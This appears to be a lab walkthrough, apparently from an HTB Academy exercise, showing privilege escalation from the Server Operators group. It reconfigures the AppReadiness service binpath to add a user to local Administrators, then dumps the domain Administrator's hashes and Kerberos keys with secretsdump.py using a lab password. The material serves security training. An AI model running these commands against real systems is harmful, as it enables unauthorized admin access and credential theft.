# Server Operators

## Current User Groups

```pwsh
PS C:\Users\server_adm> whoami /groups
```

```output title="Output" hl_lines="7"
GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Server Operators                   Alias            S-1-5-32-549 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Desktop Users               Alias            S-1-5-32-555 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\REMOTE INTERACTIVE LOGON      Well-known group S-1-5-14     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE                   Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
LOCAL                                      Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity Well-known group S-1-18-1     Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288
```

## Current User Privileges

```pwsh
PS C:\Users\server_adm> whoami /priv
```

```output title="Output" hl_lines="8 9"
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                         State
============================= =================================== ========
SeMachineAccountPrivilege     Add workstations to domain          Disabled
SeSystemtimePrivilege         Change the system time              Disabled
SeBackupPrivilege             Back up files and directories       Disabled
SeRestorePrivilege            Restore files and directories       Disabled
SeShutdownPrivilege           Shut down the system                Disabled
SeChangeNotifyPrivilege       Bypass traverse checking            Enabled
SeRemoteShutdownPrivilege     Force shutdown from a remote system Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set      Disabled
SeTimeZonePrivilege           Change the time zone                Disabled
```

## AppReadiness Query Configuration

```pwsh
PS C:\Users\server_adm> sc.exe qc AppReadiness
```

```output title="Output" hl_lines="12"
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: AppReadiness
        TYPE               : 20  WIN32_SHARE_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Windows\System32\svchost.exe -k AppReadiness -p
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : App Readiness
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem
```

## AppReadiness Permissions

```pwsh
PS C:\Users\server_adm> C:\Tools\PsService.exe -accepteula Security AppReadiness
```

```output title="Output" hl_lines="7 35"
PsService v2.25 - Service information and configuration utility
Copyright (C) 2001-2010 Mark Russinovich
Sysinternals - www.sysinternals.com

SERVICE_NAME: AppReadiness
DISPLAY_NAME: App Readiness
        ACCOUNT: LocalSystem
        SECURITY:
        [ALLOW] NT AUTHORITY\SYSTEM
                Query status
                Query Config
                Interrogate
                Enumerate Dependents
                Pause/Resume
                Start
                Stop
                User-Defined Control
                Read Permissions
        [ALLOW] BUILTIN\Administrators
                All
        [ALLOW] NT AUTHORITY\INTERACTIVE
                Query status
                Query Config
                Interrogate
                Enumerate Dependents
                User-Defined Control
                Read Permissions
        [ALLOW] NT AUTHORITY\SERVICE
                Query status
                Query Config
                Interrogate
                Enumerate Dependents
                User-Defined Control
                Read Permissions
        [ALLOW] BUILTIN\Server Operators
                All
```

## AppReadiness Binary Path Configuration

```pwsh
PS C:\Users\server_adm> sc.exe config AppReadiness binpath="net localgroup Administrators server_adm /add"
```

```output title="Output"
[SC] ChangeServiceConfig SUCCESS
```

## AppReadiness Start

```pwsh
PS C:\Users\server_adm> sc.exe start AppReadiness
```

```output title="Output"
[SC] StartService FAILED 1053:

The service did not respond to the start or control request in a timely fashion.
```

## Checking Attack Results

```pwsh
PS C:\Users\server_adm> net localgroup Administrators
```

```output title="Output" hl_lines="10"
Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
Domain Admins
Enterprise Admins
server_adm
The command completed successfully.
```

## Dumping Hashes

```sh
my@attack:~$ secretsdump.py 'INLANEFREIGHT.LOCAL'/'server_adm':'HTB_@cademy_stdnt!'@10.129.5.76 -just-dc-user Administrator
```

```output title="Output" hl_lines="3"
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:7796ee39fd3a9c3a1844556115ae1a54:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:f220c24907b50fe1666a8227013389f60c775440806853065f80d9ecbe5a4a18
Administrator:aes128-cts-hmac-sha1-96:9f9f3c7d7a4db1dc88197c0b00b444f9
Administrator:des-cbc-md5:a7fe6bceb9975107
```
